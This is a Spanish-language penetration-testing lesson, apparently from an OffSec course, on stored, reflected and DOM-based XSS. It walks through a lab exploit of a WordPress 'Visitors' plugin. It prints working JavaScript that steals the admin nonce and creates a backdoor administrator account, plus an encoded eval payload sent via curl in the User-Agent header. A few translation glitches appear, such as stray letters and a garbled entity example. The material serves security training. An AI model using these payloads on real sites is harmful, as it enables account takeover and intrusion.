# Cross-Site Scripting (XSS)

Una de las características más importantes de una aplicación web bien defendida es la sanitización de datos, un proceso en el cual la entrada del usuario se procesa para eliminar o transformar todos los caracteres o cadenas peligrosas. Los datos no sanitizados permiten que un atacante inyecte y potencialmente ejecute código malicioso.

Cross-Site Scripting (XSS) es una vulnerabilidad que explota la confianza de un usuario en un sitio web al inyectar dinámicamente contenido en la página renderizada por el navegador del usuario.

### Teoría de XSS Almacenado vs. Reflejado

#### **Almacenado XSS:**

Los ataques de XSS almacenado, también conocidos como XSS persistente, ocurren cuando la carga útil del exploit se almacena en una base de datos o en caché de alguna otra manera por un servidor. La aplicación web luego recupera esta carga útil y la muestra a cualquiera que visite una página vulnerable. Por lo tanto, una sola vulnerabilidad de XSS almacenado puede atacar a todos los usuarios del sitio. Estas vulnerabilidades a menudo existen en software de foros, especialmente en secciones de comentarios, en revisiones de productos o en cualquier lugar donde se pueda almacenar y revisar el contenido del usuario más tarde.

#### **Reflejado XSS:**

Los ataques de XSS reflejado generalmente incluyen la carga útil en una solicitud o enlace manipulado. La aplicación web toma este valor y lo coloca en el contenido de la página. Esta variante de XSS solo ataca a la persona que envía la solicitud o visita el enlace. Las vulnerabilidades de XSS reflejado a menudo pueden ocurrir en campos y resultados de búsqueda, así como en cualquier lugar donde la entrada del usuario se incluya en mensajes de error.

Cualquiera de estas dos variantes de vulnerabilidad puede manifestarse como del lado del cliente (navegador) o del servidor; también pueden ser basadas en DOM.

#### **XSS basado en DOM:**

El XSS basado en DOM ocurre únicamente dentro del Modelo de Objetos del Documento (DOM) de la página. Debemos saber que los navegadores analizan el contenido HTML de una página y luego generan una representación interna del DOM. Este tipo de XSS ocurre cuando el DOM de una página se modifica con valores controlados por el usuario. El XSS basado en DOM puede ser almacenado o reflejado.

La clave es que los ataques de XSS basados en DOM ocurren cuando un navegador analiza el contenido de la página y ejecuta el JavaScript insertado. No importa cómo se entregue y ejecute la carga útil de XSS, los scripts inyectados se ejecutan en el contexto del usuario que visita la página afectada. Esto significa que el navegador del usuario, no la aplicación web, ejecuta la carga útil de XSS. Sin embargo, estos ataques pueden ser significativos, con impactos que incluyen la toma de sesiones, la redirección forzada a páginas maliciosas, la ejecución de aplicaciones locales como ese usuario, o incluso aplicaciones web troyanizadas. En las secciones siguientes, exploraremos algunos de estos ataques.

## **JavaScript Refresher**

Cuando un navegador procesa la respuesta HTTP de un servidor que contiene HTML, el navegador crea un árbol DOM y lo renderiza. El DOM está compuesto por todas las formas, entradas, imágenes, etc., relacionadas con la página web.

El papel de JavaScript es acceder y modificar el DOM de la página, lo que resulta en una experiencia de usuario más interactiva. Desde la perspectiva de un atacante, esto también significa que si podemos inyectar código JavaScript en la aplicación, podemos acceder y modificar el DOM de la página. Con acceso al DOM, podemos redirigir formularios de inicio de sesión, extraer contraseñas y robar cookies de sesión.

Al igual que muchos otros lenguajes de programación, JavaScript puede combinar un conjunto de instrucciones en una función.

```javascript
function multiplyValues(x, y) {
  return x * y;
}

let a = multiplyValues(3, 5);
console.log(a);
```

En el ejemplo anterior, declaramos una función llamada `multiplyValues` en las líneas 1-3 que acepta dos valores enteros como parámetros y devuelve su producto.

Al declarar la variable `a`, no asignamos simplemente cualquier tipo a la variable, ya que JavaScript es un lenguaje de tipado laxo. Esto significa que el tipo real de la variable `a` se infiere como un tipo Number según el tipo de los argumentos de la función invocada, que son tipos Number. Como último paso, en la línea 6 imprimimos el valor de `a` en la consola.

Identificación de Vulnerabilidades XSS

Podemos encontrar posibles puntos de entrada para XSS al examinar una aplicación web e identificar campos de entrada (como campos de búsqueda) que aceptan datos no sanitizados, los cuales luego se muestran como salida en páginas subsiguientes.

Una vez que identificamos un punto de entrada, podemos ingresar caracteres especiales y observar la salida para determinar si alguno de los caracteres especiales retorna sin filtrar.

Los caracteres especiales más comúnmente utilizados para este propósito incluyen: < > ' " { } ; Listado 120 - Caracteres especiales para HTML y JavaScript

Ahora describiremos el propósito de estos caracteres especiales. HTML utiliza "<" y ">" para denotar elementos, los diversos componentes que conforman un documento HTML. JavaScript utiliza "{" y "}" en declaraciones de funciones. Las comillas simples (') y dobles (") se utilizan para denotar cadenas, y los puntos y coma (;) se utilizan para marcar el final de una declaración.

Si la aplicación no elimina ni codifica estos caracteres, podría ser vulnerable a XSS porque la aplicación interpreta los caracteres como código, lo que a su vez permite la ejecución de código adicional.

Aunque existen múltiples tipos de codificación, las más comunes que encontraremos en aplicaciones web son la codificación HTML y la codificación de URL. La codificación de URL, a veces llamada codificación porcentual, se utiliza para convertir caracteres no ASCII y reservados en URL, como convertir un espacio a "%20".

La codificación HTML (o referencias de caracteres) se puede utilizar para mostrar caracteres que normalmente tienen significados especiales, como elementos de etiquetas. Por ejemplo, "<" es la referencia de caracteres para "<". Cuando se encuentra con este tipo de codificación, el navegador no interpretará el carácter como el inicio de un elemento, sino que mostrará el carácter real tal como está.

Si podemos inyectar estos caracteres especiales en la página, el navegador los tratará como elementos de código. Luego podemos comenzar a construir código que se ejecutará en el navegador de la víctima una vez que cargue el código JavaScript maliciosamente inyectado.

Podría ser necesario utilizar conjuntos diferentes de caracteres según dónde se incluya nuestra entrada. Por ejemplo, si nuestra entrada se agrega entre etiquetas div, necesitaremos incluir nuestras propias etiquetas de script y ser capaces de inyectar "<" y ">" como parte de la carga útil. Si nuestra entrada se agrega dentro de una etiqueta JavaScript existente, es posible que solo necesitemos comillas y puntos y coma para agregar nuestro propio código.

XSS Básico

Vamos a demostrar un XSS básico con un ataque simple contra la instancia de WordPress de OffSec. La instalación de WordPress está ejecutando un plugin llamado "Visitors" que es vulnerable a XSS almacenado. El principal atributo vulnerable del plugin es su capacidad de almacenar datos de visitantes del sitio web, incluyendo campos como IP, origen y User-Agent.

El código fuente del plugin se puede descargar desde su sitio web. Si inspeccionamos el archivo database.php, podemos verificar cómo se almacenan los datos dentro de la base de datos de WordPress:

Esta función PHP es responsable de analizar varias cabeceras de solicitudes HTTP, incluida la de User-Agent, que se guarda en el valor del registro useragent.

A continuación, cada vez que un administrador de WordPress carga el plugin Visitor, la función ejecutará la siguiente porción de código desde start.php:

```php
$i = count(VST_get_records($date_start, $date_finish));
foreach(VST_get_records($date_start, $date_finish) as $record) {
    echo '
    <tr class="active">
        <td scope="row">'.$i.'</td>
        <td scope="row">'.date_format(date_create($record->datetime), get_option("links_updated_date_format")).'</td>
        <td scope="row">'.$record->patch.'</td>
        <td scope="row"><a href="https://www.geolocation.com/es?ip='.$record->ip.'#ipresult">'.$record->ip.'</a></td>
        <td>'.$record->useragent.'</td>
    </tr>';
    $i--;
}
```

Listado 122 - Inspeccionando la Función de Visualización de Registros del Plugin Visitors

En el código anterior, notaremos que el valor del registro useragent se recupera de la base de datos e se inserta directamente en la etiqueta de datos de tabla HTML (td), sin ningún tipo de saneamiento de datos.

Como el encabezado User-Agent está bajo control del usuario, podríamos crear un ataque XSS insertando una etiqueta de script que invoque el método alert() para generar un mensaje emergente. Dado el impacto visual inmediato, este método se utiliza comúnmente para verificar si una aplicación es vulnerable a XSS.

Aunque acabamos de realizar un enfoque de prueba de caja blanca, podríamos haber descubierto la misma vulnerabilidad probando el plugin mediante un enfoque de prueba de caja negra utilizando fuzzing en las cabeceras HTTP.

Con Burp configurado como proxy y la interceptación deshabilitada, podemos iniciar nuestro ataque navegando primero a http://offsecwp/ utilizando Firefox. Luego iremos a Burp Proxy > Historial HTTP, haremos clic derecho en la solicitud, y seleccionaremos "Enviar a Repeater".

Al pasar a la pestaña "Repeater", podemos reemplazar el valor predeterminado de User-Agent con una etiqueta de script que incluya el método de alerta (`<script>alert(42)</script>`), y luego enviar la solicitud.

Si el servidor responde con un mensaje 200 OK, deberíamos tener confianza en que nuestra carga útil ahora está almacenada en la base de datos de WordPress.

Para verificar esto, iniciemos sesión en la consola de administración en http://offsecwp/wp-login.php utilizando las credenciales admin/password.

Si navegamos hasta la consola del plugin Visitors en admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php, veremos un banner emergente que muestra el número 42, lo que confirma que nuestra inyección de código ha funcionado.

Escalada de Privilegios a través de XSS

Dado que ahora somos capaces de almacenar código JavaScript dentro de la aplicación WordPress objetivo y ejecutarlo cuando el usuario administrador carga la página, estamos listos para ser más creativos y explorar diferentes formas de obtener privilegios administrativos.

Podríamos aprovechar nuestro XSS para robar cookies y la información de sesión si la aplicación utiliza una configuración de gestión de sesión insegura. Si podemos robar la cookie de un usuario autenticado, podríamos hacernos pasar por ese usuario en el sitio web objetivo.

Los sitios web utilizan cookies para realizar un seguimiento del estado e información sobre los usuarios. Las cookies se pueden configurar con varias banderas opcionales, incluyendo dos que son particularmente interesantes para nosotros como probadores de penetración: Secure y HttpOnly.

* La bandera Secure instruye al navegador a enviar la cookie solo sobre conexiones cifradas, como HTTPS. Esto protege la cookie de ser enviada en texto plano y capturada en la red.
* La bandera HttpOnly instruye al navegador a denegar el acceso de JavaScript a la cookie. Si esta bandera no está establecida, podemos usar una carga útil XSS para robar la cookie.

Verifiquemos la naturaleza de las cookies de sesión de WordPress primero iniciando sesión como el usuario administrador.

Luego, abriremos las Herramientas de Desarrollo Web, nos dirigiremos a la pestaña Almacenamiento y haremos clic en http://offsecwp en el menú Cookies a la izquierda.

Notamos que nuestro navegador ha almacenado seis cookies diferentes, pero solo cuatro son cookies de sesión. De estas cuatro cookies, si excluimos la insignificante wordpress\_test\_cookie, todas admiten la función HttpOnly.

Dado que todas las cookies de sesión solo pueden enviarse a través de HTTP, lamentablemente, tampoco pueden recuperarse a través de JavaScript mediante nuestro vector de ataque. Necesitaremos encontrar un nuevo enfoque.

Cuando el administrador carga los paneles de control del plugin Visitors que contienen el JavaScript inyectado, ejecuta lo que proporcionamos como carga útil, ya sea un banner emergente de alerta o una función JavaScript más compleja.

Por ejemplo, podríamos diseñar una función JavaScript que agregue otra cuenta administrativa de WordPress, de modo que una vez que el administrador real ejecute nuestro código inyectado, la función se ejecutará en segundo plano.

Para tener éxito con nuestro enfoque de ataque, necesitamos abordar otra clase de ataque a aplicaciones web. Para desarrollar este ataque, construiremos un escenario similar al representado por Shift8. Primero, crearemos una función JavaScript que obtenga el nonce del administrador de WordPress.

El nonce es un token generado por el servidor que se incluye en cada solicitud HTTP para agregar aleatoriedad y prevenir ataques de falsificación de solicitudes entre sitios (CSRF).

Un ataque CSRF ocurre a través de ingeniería social, en el cual la víctima hace clic en un enlace malicioso que realiza una acción preconfigurada en nombre del usuario. El enlace malicioso podría disfrazarse con una descripción aparentemente inofensiva, a menudo atrayendo a la víctima a hacer clic en él.

```html
<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000"">¡Echa un vistazo a estos memes de gatos asombrosos!</a>
```

Listado 123 - Ejemplo de ataque CSRF

En el ejemplo anterior, el enlace URL apunta a una API del sitio web Fake Crypto Bank, que realiza una transferencia de bitcoin a la cuenta del atacante. Si este enlace se incrustara en el código HTML de un correo electrónico, el usuario solo vería la descripción del enlace, pero no el recurso HTTP real al que apunta. Este ataque tendría éxito si el usuario ya está conectado con una sesión válida en el mismo sitio web.

En nuestro caso, al incluir y verificar el nonce seudorandom, WordPress evita este tipo de ataque, ya que un atacante no podría tener conocimiento previo del token. Sin embargo, como explicaremos pronto, el nonce no será un obstáculo para la vulnerabilidad de XSS almacenada que descubrimos en el plugin.

Como se mencionó, para realizar cualquier acción administrativa, primero necesitamos recopilar el nonce. Podemos lograr esto utilizando la siguiente función JavaScript:

```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

Esta función realiza una nueva solicitud HTTP hacia la URL /wp-admin/user-new.php y guarda el valor del nonce encontrado en la respuesta HTTP en función de la expresión regular. El patrón regex coincide con cualquier valor alfanumérico contenido entre la cadena /ser" value=" y las comillas dobles.

Ahora que hemos recuperado dinámicamente el nonce, podemos crear la función principal responsable de crear el nuevo usuario administrador.

```javascript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

Listado 125 - Creando una Nueva Cuenta de Administrador de WordPress

En esta función, se destaca la nueva cuenta de administrador con puerta trasera, justo después del nonce que obtuvimos anteriormente. Si nuestro ataque tiene éxito, podremos obtener acceso administrativo a toda la instalación de WordPress.

Para asegurarnos de que nuestra carga útil JavaScript sea manejada correctamente por Burp y la aplicación objetivo, primero necesitamos minimizarla y luego codificarla.

Para minimizar nuestro código de ataque en una sola línea, podemos dirigirnos a JS Compress.

Una vez que hayamos hecho clic en "Comprimir JavaScript", copiaremos la salida y la guardaremos localmente. Como paso final del ataque, vamos a codificar el código JavaScript minimizado, para que no haya interferencias con el envío de la carga útil. Podemos hacer esto utilizando la siguiente función:

```javascript
function encode_to_javascript(string) {
    var input = string;
    var output = '';
    for(pos = 0; pos < input.length; pos++) {
        output += input.charCodeAt(pos);
        if(pos != (input.length - 1)) {
            output += ",";
        }
    }
    return output;
}

let encoded = encode_to_javascript('insert_minified_javascript');
console.log(encoded);
```

Listado 126 - Función de Codificación JS

La función `encode_to_javascript` analizará el parámetro de cadena JS minimizado y convertirá cada carácter en el código entero UTF-16 correspondiente utilizando el método `charCodeAt`.

Vamos a decodificar y ejecutar la cadena codificada, primero decodificándola con el método fromCharCode381 y luego ejecutándola mediante el método eval()382. Una vez que hayamos copiado la cadena codificada, podemos insertarla con el siguiente comando curl y lanzar el ataque:

```
kali@kali:~$ curl -i http://offsecwp --user-agent
"<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,1
16,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113
,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45
,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,
114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,
82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101
,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,1
10,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,10
1,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,
114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110
,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110
,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,1
01,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,
95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116
,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61
,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,
107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97
,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77
,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,
34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117
,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,
111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,11
1,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,1
00,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,
97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
Listing 127 - Launching the Final XSS Attack through Curl
```

Antes de ejecutar el comando de ataque curl, iniciemos Burp y dejemos el Intercept activado. D Instruimos a curl para enviar una solicitud HTTP especialmente diseñada con un encabezado User-Agent que contiene nuestra carga útil maliciosa, luego la reenviamos a nuestra instancia de Burp para que podamos inspeccionarla más a fondo. Después de ejecutar el comando curl, podemos inspeccionar la solicitud en Burp.

Observamos que solo hay una entrada presente y aparentemente no se ha registrado ningún User-Agent. Esto se debe a que el campo User-Agent contenía nuestro ataque incrustado en las etiquetas "", por lo que el navegador no puede representar ninguna cadena de ello. D Al cargar las estadísticas del complemento, deberíamos haber ejecutado el script malicioso, así que verifiquemos si nuestro ataque tuvo éxito haciendo clic en el menú Usuarios en el panel izquierdo.

¡Excelente! Debido a esta vulnerabilidad XSS, logramos elevar los privilegios de nuestra aplicación de un usuario estándar a un administrador mediante una solicitud HTTP especialmente diseñada. D Ahora podríamos avanzar en nuestro ataque y obtener acceso al host subyacente mediante la creación de un complemento personalizado de WordPress con una shell web incrustada. Cubriremos las shells web de manera más detallada en otro módulo.
